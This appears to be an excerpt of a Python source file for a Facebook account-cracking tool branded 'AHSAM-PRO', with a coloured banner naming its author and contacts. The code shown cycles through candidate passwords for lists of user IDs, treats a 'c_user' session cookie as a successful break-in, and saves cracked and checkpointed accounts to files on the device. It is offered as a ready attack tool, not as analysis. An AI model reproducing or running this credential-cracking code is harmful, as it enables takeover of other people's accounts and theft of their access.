...
\x1b[1;92m.| $$  \$ | $$| $$  | $$      | $$  | $$ \$$    $$| $$  | $$
 ...
 [$]*****************************************************[$]
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║ TOOL NAME : { Mr.Auh }   ║
   \x1b[1;92m║ AUTHOR    : MR. AHSAM      ║
   \x1b[1;92m║ GITHUB    : git.me/AHSAMJOIYA302 ║
   \x1b[1;92m║ FACEBOOK  : Ahsam ul haq   ║
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/AHSAM-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/AHSAM-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back AHSAM-PRO Tools")
...
def R():
			...
			print ("\033[1m [!] Tool    : AHSAM-PRO")

			print (" [!] Brand   : MR.AHSAM")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[AHSAM]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/AHSAM_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/AHSAM_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+923442001876")
